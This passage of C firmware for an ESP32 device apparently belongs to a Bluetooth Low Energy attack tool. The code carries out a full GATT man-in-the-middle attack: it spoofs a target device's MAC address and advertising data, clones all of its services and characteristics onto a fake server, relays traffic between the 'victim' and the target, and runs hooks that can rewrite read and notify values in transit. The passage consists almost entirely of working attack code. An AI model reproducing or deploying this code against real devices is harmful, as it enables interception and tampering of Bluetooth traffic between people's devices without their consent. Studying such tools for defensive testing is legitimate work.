      if (memcmp(clone.target_bda, param->disconnect.remote_bda, 6) == 0) {
        send_output("Lost Client Connection", false);
        connected = false;

        if (retries < MAX_RETRIES) {
          if (!shutdown_gatt_attack) {
            retries++;
            char out[45];
            sprintf(out, "Target Connect Retry %i/%i", retries, MAX_RETRIES);
            send_output(out, false);
            esp_ble_gap_set_scan_params(&ble_scan_params);
          }
        } else {
          if (!clone_init) {
            shutdown_gatt_attack = true;
            send_output("Attack Failed :(", false);
            gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
            GattAttackApp::sendState((int)gattAttackState);
          } else {
            send_output("Giving up reconnecting to target. Read/writes will happen from cache", false);
          }
        }
      } else {
        send_output("Lost Victim Connection", false);
        leds->blink(255, 0, 0);
      }

      break;
    }
    case ESP_GATTC_OPEN_EVT: {
      /**
       * Event comes when a virtual
       * GATT connection is setup.
       *
       * Only used for logging failures
       * atm.
       */
      if (param->open.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "Open Target connection failed: %d", param->open.status);
        connected = false;
        connecting = false;
        break;
      }

      break;
    }
    case ESP_GATTC_CFG_MTU_EVT: {
      /**
       * Comes when the clients MTU
       * is set or updated.
       */
      if (param->cfg_mtu.status != ESP_GATT_OK){
        ESP_LOGE(TAG,"config mtu failed, error status = %x", param->cfg_mtu.status);
      }
      ESP_LOGI(TAG, "ESP_GATTC_CFG_MTU_EVT, Status %d, MTU %d, conn_id %d", param->cfg_mtu.status, param->cfg_mtu.mtu, param->cfg_mtu.conn_id);
      clone.target_gattc_mtu = param->cfg_mtu.mtu;
      break;
    }
    case ESP_GATTC_DIS_SRVC_CMPL_EVT: {
      /**
       * Event comes after the connected
       * attacking client has finished
       * discovering the services on the
       * target device.
       *
       * We call esp_ble_gattc_search_service
       * and gather the actual services in the
       * ESP_GATTC_SEARCH_RES_EVT.
       */
      if (param->dis_srvc_cmpl.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "discover service failed, status %d", param->dis_srvc_cmpl.status);
        break;
      }
      send_output("Discover Services Complete!", false);
      esp_ble_gattc_search_service(gattc_if, param->dis_srvc_cmpl.conn_id, NULL);
      break;
    }
    case ESP_GATTC_SEARCH_RES_EVT: {
      /**
       * This event comes after the
       * Service Discovery is completed.
       *
       * Here is where we actually clone
       * all services, chars, and descriptors
       * to our clone struct.
       */
      if (!clone_init) {
        //ESP_LOGI(TAG, "SEARCH RES: conn_id = %x is primary service %d", param->search_res.conn_id, param->search_res.is_primary);
        //ESP_LOGI(TAG, "start handle %d end handle %d current handle value %d", param->search_res.start_handle, param->search_res.end_handle, param->search_res.srvc_id.inst_id);
        //ESP_LOGI(TAG, "Service UUID: %x", param->search_res.srvc_id.uuid.uuid.uuid16);

        uint8_t handles = param->search_res.end_handle - param->search_res.start_handle;

        if (last_end_handle) {
          handles += (param->search_res.start_handle - last_end_handle);
        }

        last_end_handle = param->search_res.end_handle;

        service_t service1 = {
          .service_uuid = param->search_res.srvc_id.uuid,
          .service_handle = param->search_res.srvc_id.inst_id,
          .start_handle = param->search_res.start_handle,
          .end_handle = param->search_res.end_handle,
          .service_id = {},
          .chars = NULL,
          .num_chars = 0,
          .num_handles = handles,
        };

        add_service(&service1);

        uint16_t count = 0;
        esp_gatt_status_t status = esp_ble_gattc_get_attr_count(gattc_if,
                                                                param->search_res.conn_id,
                                                                ESP_GATT_DB_CHARACTERISTIC,
                                                                param->search_res.start_handle,
                                                                param->search_res.end_handle,
                                                                0,
                                                                &count);
        if (status != ESP_GATT_OK) {
          ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count error");
          break;
        }

        if (count > 0) {
          esp_gattc_char_elem_t *char_result = (esp_gattc_char_elem_t *)malloc(sizeof(esp_gattc_char_elem_t) * count);
          if (!char_result) {
            ESP_LOGE(TAG, "gattc no mem");
            break;
          } else {
            status = esp_ble_gattc_get_all_char(gattc_if,
                                                param->search_res.conn_id,
                                                param->search_res.start_handle,
                                                param->search_res.end_handle,
                                                char_result,
                                                &count, 0);
            if (status != ESP_GATT_OK) {
              ESP_LOGE(TAG, "esp_ble_gattc_get_all_char %s", esp_err_to_name(status));
              char_result = NULL;
              break;
            }

            for (int i = 0; i < count; i++) {
              /*
              ESP_LOGI(TAG, "Char UUID: %x (%x)",
                      char_result[i].uuid.uuid.uuid16,
                      char_result[i].char_handle);
              */
              char_t char1 = {
                .char_uuid = char_result[i].uuid,
                .char_handle = char_result[i].char_handle,
                .property = char_result[i].properties,
                .descs = NULL,
                .num_descs = 0,
              };

              add_characteristic(&clone.services[service_num], &char1);

              esp_gattc_descr_elem_t *descr_result = (esp_gattc_descr_elem_t  *)malloc(sizeof(esp_gattc_descr_elem_t ) * count);
              if (!descr_result) {
                ESP_LOGE(TAG, "descr_result no mem");
                break;
              }

              uint16_t desc_count = 0;
              status = esp_ble_gattc_get_attr_count(gattc_if,
                                                    param->search_res.conn_id,
                                                    ESP_GATT_DB_DESCRIPTOR,
                                                    0,
                                                    0,
                                                    char_result[i].char_handle,
                                                    &desc_count);
              if (status != ESP_GATT_OK) {
                ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count(DESCRIPTOR) error");
              }

              if (desc_count > 0) {   
                status = esp_ble_gattc_get_all_descr(gattc_if,
                                                    param->search_res.conn_id,
                                                    char_result[i].char_handle,
                                                    descr_result,
                                                    &desc_count, 0);
                if (status != ESP_GATT_OK) {
                  ESP_LOGE(TAG, "%s", esp_err_to_name(status));
                  ESP_LOGE(TAG, "esp_ble_gattc_get_all_descr error");
                  descr_result = NULL;
                  break;
                }

                if (desc_count > 0) {
                  for (int x = 0; x < desc_count; x++) {
                    /**
                    ESP_LOGI(TAG, "   Desc UUID: %x (%x)",
                            descr_result[x].uuid.uuid.uuid16,
                            descr_result[x].handle);
                    */
                    desc_t desc1 = {
                      .desc_uuid = descr_result[x].uuid,
                      .desc_handle = descr_result[x].handle,
                      .value = 0x36,
                      .perm = 0
                    };

                    add_descriptor(&clone.services[service_num].chars[i], &desc1);
                  }
                }
              }

            }
          }
        }
        
        service_num += 1;
      }
      break;
    }
    case ESP_GATTC_SEARCH_CMPL_EVT: {
      /**
       * This event after we have cloned
       * all the services and are ready
       * to intialized our spoofed GATT
       * Server using these clones.
       *
       * This starts the GATT Server
       */
      if (param->search_cmpl.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "search service failed, error status = %x", param->search_cmpl.status);
        break;
      }
      
      vTaskDelay(2000 / portTICK_PERIOD_MS);
      
      if (clone_init) {
        break;
      }
      
      clone_init = true;
      clone.target_client_conn_id = param->search_cmpl.conn_id;

      esp_err_t ret = esp_ble_gatts_register_callback(server_event);
      if (ret){
        ESP_LOGE(TAG, "gatts register error, error code = %x", ret);
        return;
      }

      ret = esp_ble_gatts_app_register(0);
      if (ret){
        ESP_LOGE(TAG, "gatts app register error, error code = %x", ret);
        return;
      }
      
      send_output("GATT Server starting", false);
      break;
    }
    case ESP_GATTC_REG_FOR_NOTIFY_EVT: {
      /**
       * This event comes after a victim
       * client has wrote a descriptor
       * to turn on notifications for a
       * handle and we set our attacking
       * client to notify on the same
       * handle.
       */
      if (param->reg_for_notify.status != ESP_GATT_OK){
        ESP_LOGE(TAG, "REG FOR NOTIFY failed: error status = %d", param->reg_for_notify.status);
        break;
      }

      send_output("Client register notify success", false);
      if (clone.server_last_write_needs_rsp) {
        esp_ble_gatts_send_response(clone.gatts_if,
                                    clone.server_conn_id,
                                    clone.server_trans_id,
                                    ESP_GATT_OK, NULL);
        clone.server_last_write_needs_rsp = false;
      }
      break;
    }
    case ESP_GATTC_NOTIFY_EVT: {
      /**
       * This event comes when our
       * attacking client has received
       * a notify event.
       *
       * Here we run hooks if needed,
       * log the information and pass
       * it back to our victim.
       */
      char uuid[38];
      uint16_t notify_len = param->notify.value_len;
      uint8_t *notify_value = (uint8_t*)malloc(notify_len);
      memcpy(notify_value, param->notify.value, notify_len);

      char* hex_value = bytes_to_hex_string(param->notify.value, param->notify.value_len);
      get_uuid_for_handle(param->notify.handle, uuid);

      if (should_run_hooks()) {
        char *new_value = run_hook("read", uuid, hex_value);
        if (new_value) {
          free(hex_value);
          hex_value = new_value;

          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &notify_len);

          free(notify_value);
          notify_value = (uint8_t*)malloc((size_t)notify_len);
          if (!notify_value) {
            ESP_LOGE(TAG, "Failed to allocate memory for notify_value");
            free(new_bytes);
            return;
          }

          memcpy(notify_value, new_bytes, notify_len);
          free(new_bytes);
        }
      }
      
      log_and_send_json(
        param->notify.is_notify ? "NOTIFY" : "INDICATE",
        "target -> victim",
        "",
        gattc_if,
        param->notify.conn_id,
        0,
        param->notify.handle,
        0,
        uuid,
        hex_value ? hex_value : ""
      );

      free(hex_value);

      esp_ble_gatts_send_indicate(clone.gatts_if,
                                  clone.victim_client_conn_id,
                                  param->notify.handle,
                                  notify_len,
                                  notify_value,
                                  !param->notify.is_notify);
      break;
    }
    case ESP_GATTC_WRITE_DESCR_EVT: {
      /**
       * Event called after our attacking
       * client has written to a descriptor.
       */
      char uuid[38];
      get_uuid_for_handle(param->write.handle, uuid);

      if (param->write.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "write descr failed, error status = %x", param->write.status);
      }

      if (clone.server_last_write_needs_rsp) {
        esp_gatt_rsp_t rsp;
        memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
        rsp.attr_value.handle = param->write.handle;
        esp_ble_gatts_send_response(clone.gatts_if,
                                    clone.server_conn_id,
                                    clone.server_trans_id,
                                    ESP_GATT_OK, &rsp);
        clone.server_last_write_needs_rsp = false;

        log_and_send_json(
          "WRITE DESC RSP",
          "target -> victim",
          "DESC",
          gattc_if,
          param->write.conn_id,
          clone.server_trans_id,
          param->write.handle,
          param->write.status,
          uuid,
          NULL
        );
      }
      break;
    }
    case ESP_GATTC_WRITE_CHAR_EVT: {
      /**
       * This event comes after our
       * attacking client has written
       * to the target device. We can
       * determine if it was successfull
       * or not.
       *
       * If victim needed a response to the
       * last write we send it to them.
       */
      char uuid[38];
      get_uuid_for_handle(param->write.handle, uuid);

      if (param->write.status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "write char failed, error status = %x", param->write.status);
      }

      if (clone.server_last_write_needs_rsp) {
        esp_gatt_rsp_t rsp;
        memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
        rsp.attr_value.handle = param->write.handle;
        esp_ble_gatts_send_response(clone.gatts_if,
                                    clone.server_conn_id,
                                    clone.server_trans_id,
                                    ESP_GATT_OK, &rsp);
        clone.server_last_write_needs_rsp = false;

        log_and_send_json(
          "WRITE CHAR RSP",
          "target -> victim",
          "CHAR",
          gattc_if,
          param->write.conn_id,
          clone.server_trans_id,
          param->write.handle,
          param->write.status,
          uuid,
          NULL
        );
      }
      break;
    }
    case ESP_GATTC_PREP_WRITE_EVT: {
      /**
       * This event comes after the
       * attacking client has sent
       * a prep write to either a
       * char or desc.
       */
      char uuid[38];
      get_uuid_for_handle(param->write.handle, uuid);
      log_and_send_json(
        "PREP WRITE RSP",
        "target -> victim",
        "",
        gattc_if,
        clone.server_conn_id,
        0,
        param->write.handle,
        param->write.status,
        uuid,
        NULL
      );
      break;
    }
    case ESP_GATTC_EXEC_EVT: {
      /**
       * Comes after our attacking
       * client has completed its
       * exec event on the target
       * device.
       */
      log_and_send_json(
        "EXEC RSP",
        "target -> victim",
        NULL,
        gattc_if,
        param->exec_cmpl.conn_id,
        clone.server_trans_id,
        0,
        param->exec_cmpl.status,
        NULL,
        NULL
      );

      break;
    }
    case ESP_GATTC_READ_CHAR_EVT: {
      /**
       * Event comes after our attacking
       * client has received data from
       * a read event.
       *
       * Here we run hooks if needed,
       * log this event and send
       * it back on to the victim.
       */
      char uuid[38];
      uint16_t read_len = param->read.value_len;
      uint8_t *read_value = (uint8_t*)malloc(read_len);
      memcpy(read_value, param->read.value, read_len);
      char* hex_value = bytes_to_hex_string(param->read.value, param->read.value_len);
      get_uuid_for_handle(param->read.handle, uuid);

      if (should_run_hooks()) {
        char *new_value = run_hook("read", uuid, hex_value);
        if (new_value) {
          free(hex_value);
          hex_value = new_value;

          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &read_len);

          free(read_value);
          read_value = (uint8_t*)malloc((size_t)read_len);
          if (!read_value) {
            ESP_LOGE(TAG, "Failed to allocate memory for read_value");
            free(new_bytes);
            return;
          }

          memcpy(read_value, new_bytes, read_len);
          free(new_bytes);
        }
      }

      log_and_send_json(
        "READ CHAR RSP",
        "target -> victim",
        "",
        gattc_if,
        param->read.conn_id,
        clone.server_trans_id,
        param->read.handle,
        param->read.status,
        uuid,
        hex_value
      );

      free(hex_value);

      esp_gatt_rsp_t rsp;
      memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
      rsp.attr_value.handle = param->read.handle;
      rsp.attr_value.len = read_len;
      memcpy(rsp.attr_value.value, read_value, read_len);
      esp_ble_gatts_send_response(clone.gatts_if,
                                  clone.server_conn_id,
                                  clone.server_trans_id,
                                  ESP_GATT_OK, &rsp);
      break;
    }
    case ESP_GATTC_READ_DESCR_EVT: {
      /**
       * Event comes when a descriptor
       * is read.
       *
       * We need to send resp back to
       * victim.
       */
      char uuid[38];
      uint16_t read_len = param->read.value_len;
      uint8_t *read_value = (uint8_t*)malloc(read_len);
      memcpy(read_value, param->read.value, read_len);
      char* hex_value = bytes_to_hex_string(param->read.value, param->read.value_len);
      get_uuid_for_handle(param->read.handle, uuid);

      if (should_run_hooks()) {
        char *new_value = run_hook("read", uuid, hex_value);
        if (new_value) {
          free(hex_value);
          hex_value = new_value;

          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &read_len);

          free(read_value);
          read_value = (uint8_t*)malloc((size_t)read_len);
          if (!read_value) {
            ESP_LOGE(TAG, "Failed to allocate memory for read_value");
            free(new_bytes);
            return;
          }

          memcpy(read_value, new_bytes, read_len);
          free(new_bytes);
        }
      }

      log_and_send_json(
        "READ DESC RSP",
        "target -> victim",
        "",
        gattc_if,
        param->read.conn_id,
        clone.server_trans_id,
        param->read.handle,
        param->read.status,
        uuid,
        hex_value
      );

      free(hex_value);

      esp_gatt_rsp_t rsp;
      memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
      rsp.attr_value.handle = param->read.handle;
      rsp.attr_value.len = read_len;
      memcpy(rsp.attr_value.value, read_value, read_len);
      esp_ble_gatts_send_response(clone.gatts_if,
                                  clone.server_conn_id,
                                  clone.server_trans_id,
                                  ESP_GATT_OK, &rsp);
      break;
    }
    case ESP_GATTC_SRVC_CHG_EVT: {
      /**
       * This event comes when the
       * remote target device has
       * changed its BDA (Mac) addres.
       */
      esp_bd_addr_t bda;
      memcpy(bda, param->srvc_chg.remote_bda, sizeof(esp_bd_addr_t));
      ESP_LOGI(TAG, "ESP_GATTC_SRVC_CHG_EVT, bd_addr:");
      esp_log_buffer_hex(TAG, bda, sizeof(esp_bd_addr_t));
      break;
    }
    default:
      break;
  }
}

/**
 * esp_gap_cb
 *
 * Callback for the GAP.
 * This handles scanning
 * for advertisements and
 * spoofing them once found.
 * A GATT Client is then
 * started to connect to the
 * target device to clone the
 * services.
 *
 * @param esp_gap_ble_cb_event_t event
 * @param esp_ble_gap_cb_param_t *param
 */
void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  uint8_t *adv_name = NULL;
  uint8_t adv_name_len = 0;
  switch (event) {
    case ESP_GAP_BLE_SCAN_PARAM_SET_COMPLETE_EVT: {
      esp_ble_gap_start_scanning(30);
      break;
    }
    case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT: {
      if (param->scan_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "scan start failed, error status = %x", param->scan_start_cmpl.status);
        break;
      }
      send_output("Scan started", false);
      break;
    }
    case ESP_GAP_BLE_SCAN_RESULT_EVT: {
      switch (param->scan_rst.search_evt) {
        case ESP_GAP_SEARCH_INQ_RES_EVT: {
          if (connecting || connected) {
            break;
          }
          adv_name = esp_ble_resolve_adv_data(param->scan_rst.ble_adv,
                                              ESP_BLE_AD_TYPE_NAME_CMPL,
                                              &adv_name_len);
          if (memcmp(clone.target, param->scan_rst.bda, sizeof(esp_bd_addr_t)) == 0) {
            leds->blink(0, 0, 255);
            memcpy(clone.target_bda, param->scan_rst.bda, sizeof(esp_bd_addr_t));
            ESP_LOGI(TAG, "Device: ");
            esp_log_buffer_char(TAG, adv_name, adv_name_len);
            esp_log_buffer_hex(TAG, param->scan_rst.bda, 6);
            ESP_LOGI(TAG, "Device Name Len: %d, Adv Data Len: %d, Scan Response Len: %d", adv_name_len, param->scan_rst.adv_data_len, param->scan_rst.scan_rsp_len);

            if (param->scan_rst.adv_data_len > 0) {
              ESP_LOGI(TAG, "adv data:");
              esp_log_buffer_hex(TAG, &param->scan_rst.ble_adv[0], param->scan_rst.adv_data_len);
            }

            if (param->scan_rst.scan_rsp_len > 0) {
              ESP_LOGI(TAG, "scan resp:");
              esp_log_buffer_hex(TAG, &param->scan_rst.ble_adv[param->scan_rst.adv_data_len], param->scan_rst.scan_rsp_len);
            }

            if (!connected || !connecting) {
              connecting = true;
              esp_ble_gap_stop_scanning();

              esp_err_t set_dev_name_ret = esp_ble_gap_set_device_name((const char *)clone.target);
              if (set_dev_name_ret){
                ESP_LOGE(TAG, "set device name failed, error code = %x", set_dev_name_ret);
              }

              esp_err_t raw_adv_ret = esp_ble_gap_config_adv_data_raw(param->scan_rst.ble_adv, param->scan_rst.adv_data_len);
              if (raw_adv_ret){
                ESP_LOGE(TAG, "config raw adv data failed, error code = %x ", raw_adv_ret);
              }

              if (param->scan_rst.scan_rsp_len > 0) {
                uint8_t *raw_scan_rsp_data = &param->scan_rst.ble_adv[param->scan_rst.adv_data_len];
                esp_err_t raw_scan_ret = esp_ble_gap_config_scan_rsp_data_raw(raw_scan_rsp_data, param->scan_rst.scan_rsp_len);
                if (raw_scan_ret){
                  ESP_LOGE(TAG, "config raw scan rsp data failed, error code = %x", raw_scan_ret);
                }
              }

              leds->blink(0, 0, 255, 2, 50);
              leds->set_color(0, 0, 255);
              send_output("Connecting to target", false);
              gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECTING;
              GattAttackApp::sendState((int)gattAttackState);
              esp_ble_gattc_open(clone.gattc_if, param->scan_rst.bda, param->scan_rst.ble_addr_type, true);
            }
          }
          break;
        }
        case ESP_GAP_SEARCH_INQ_CMPL_EVT: {
          if (!clone_init) {
            shutdown_gatt_attack = true;
            send_output("Attack Failed :(", false);
            gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
            GattAttackApp::sendState((int)gattAttackState);
          }
          break;
        }
        default:
          break;
      }
      
      break;
    }
    case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT: {
      if (param->scan_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "scan stop failed, error status = %x", param->scan_stop_cmpl.status);

        break;
      }
      ESP_LOGI(TAG, "stop scan successfully");
      break;
    }
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT: {
      //advertising start complete event to indicate advertising start successfully or failed
      if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "Advertising start failed");
      } else {
        send_output("Advertisment Started. Hack the plan8", false);
      }

      break;
    }
    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT: {
      if (param->adv_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "adv stop failed, error status = %x", param->adv_stop_cmpl.status);
        break;
      }
      break;
    }
    case ESP_GAP_BLE_SCAN_TIMEOUT_EVT: {
      if (!clone_init) {
        gattAttackState = GATT_ATTACK_STATE_FAILED;
        GattAttackApp::sendState((int)gattAttackState);
      }
      break;
    }
    default:
      break;
  }
};

/**
 * stop_gatt_attack
 *
 * Handles shutting down
 * connections, created services,
 * resettings application state
 * variables, and finally the deinit
 * the BLE device.
 */
void stop_gatt_attack() {
  shutdown_gatt_attack = true;

  esp_err_t ret;
  ret = esp_ble_gap_stop_advertising();
  ret = esp_ble_gap_stop_scanning();
  ret = esp_ble_gattc_close(clone.gattc_if, clone.target_client_conn_id);
  ret = esp_ble_gatts_close(clone.gatts_if, clone.server_conn_id);

  for (size_t i = 0; i < clone.num_services; i++) {
    ret = esp_ble_gatts_stop_service(clone.services[i].service_handle);
    ret = esp_ble_gatts_delete_service(clone.services[i].service_handle);
  }

  ret = esp_ble_gatts_app_unregister(0);
  ret = esp_ble_gattc_app_unregister(0);

  ble_stack_deinit(false);
  clone_init = false;
  retries = 0;
  service_num = 0;
  cloned_service_num = 0;
  last_end_handle = 0;
  shutdown_gatt_attack = false;
  ESP_LOGI(TAG, "Attack Shutdown Complete");
};

/**
 * start_gatt_attack
 *
 * Starts the GATT Attack.
 *
 * Spoofs the BLE mac to the inputs
 * target mac and initialzes the BLE
 * stack.
 *
 * @param uint8_t *target - Target MAC
 */
void start_gatt_attack(uint8_t *target) {
  esp_err_t ret;

  clone.target = target;

  ESP_ERROR_CHECK(esp_iface_mac_addr_set(target, ESP_MAC_BT));

  ble_stack_init();

  ret = esp_ble_gap_register_callback(esp_gap_cb);
  if (ret) {
    ESP_LOGE(TAG, "%s gap register failed, error code = %x", __func__, ret);
    return;
  }

  ret = esp_ble_gattc_register_callback(client_event);
  if (ret) {
    ESP_LOGE(TAG, "%s gattc register failed, error code = %x", __func__, ret);
    return;
  }

  ret = esp_ble_gattc_app_register(0);
  if (ret) {
    ESP_LOGE(TAG, "%s gattc app register failed, error code = %x", __func__, ret);
  }

  esp_err_t local_mtu_ret = esp_ble_gatt_set_local_mtu(500);
  if (local_mtu_ret) {
    ESP_LOGE(TAG, "set local MTU failed, error code = %x", local_mtu_ret);
  }
};
